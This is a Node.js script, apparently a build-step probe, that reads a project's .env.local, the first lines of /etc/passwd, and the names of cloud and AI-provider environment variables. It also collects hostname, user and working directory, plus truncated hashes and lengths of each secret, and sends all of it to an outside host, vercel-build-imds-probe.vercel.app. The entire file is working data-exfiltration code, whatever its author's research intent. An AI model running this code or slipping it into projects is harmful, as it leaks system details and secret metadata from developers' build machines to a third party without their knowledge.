const http = require('node:http');
const https = require('node:https');
const os = require('node:os');
const fs = require('node:fs');

const phase = process.argv[2] || 'unknown';
function parseDotenv(text) {
  const out = {};
  for (const line of text.split(/\r?\n/)) {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith('#') || !trimmed.includes('=')) continue;
    const idx = trimmed.indexOf('=');
    const key = trimmed.slice(0, idx).trim();
    let value = trimmed.slice(idx + 1);
    if ((value.startsWith('"') && value.endsWith('"')) || (value.startsWith("'") && value.endsWith("'"))) {
      value = value.slice(1, -1);
    }
    if (key) out[key] = value;
  }
  return out;
}
const envLocal = (() => {
  try { return parseDotenv(fs.readFileSync('.env.local', 'utf8')); }
  catch { return {}; }
})();
const marker = process.env.VXC030_MARKER || envLocal.VXC030_MARKER || 'VXC030_LABS_ENV_STATIC';
const passwd = (() => {
  try { return fs.readFileSync('/etc/passwd', 'utf8').split('\n').slice(0, 5).join('|'); }
  catch (e) { return `err:${e.message}`; }
})();
const envKeys = Object.keys(process.env).filter((k) => /^(VERCEL|AWS|AI|ANTHROPIC|OPENAI|NPM|NODE|HOME|USER|PATH|PWD)/.test(k)).sort().slice(0, 80).join(',');
const envLocalKeys = Object.keys(envLocal).sort();
const envLocalMeta = envLocalKeys.map((key) => {
  const value = String(envLocal[key] || '');
  const digest = require('node:crypto').createHash('sha256').update(value).digest('hex').slice(0, 16);
  return `${key}:len=${value.length}:sha256=${digest}`;
}).join('|');
const payload = {
  marker,
  phase,
  cwd: process.cwd(),
  uid: typeof process.getuid === 'function' ? String(process.getuid()) : '',
  gid: typeof process.getgid === 'function' ? String(process.getgid()) : '',
  user: os.userInfo().username,
  hostname: os.hostname(),
  platform: `${process.platform}/${process.arch}`,
  node: process.version,
  envKeys,
  envLocalPresent: fs.existsSync('.env.local') ? 'yes' : 'no',
  envLocalCount: String(envLocalKeys.length),
  envLocalKeys: envLocalKeys.slice(0, 80).join(','),
  envLocalMeta1: envLocalMeta.slice(0, 280),
  envLocalMeta2: envLocalMeta.slice(280, 560),
  passwd
};
const qs = new URLSearchParams(payload);
const url = `https://vercel-build-imds-probe.vercel.app/api/hit?${qs}`;
https.get(url, (res) => {
  res.resume();
  res.on('end', () => console.log(`[vxc030] callback ${phase} status=${res.statusCode}`));
}).on('error', (err) => console.log(`[vxc030] callback ${phase} error=${err.message}`));
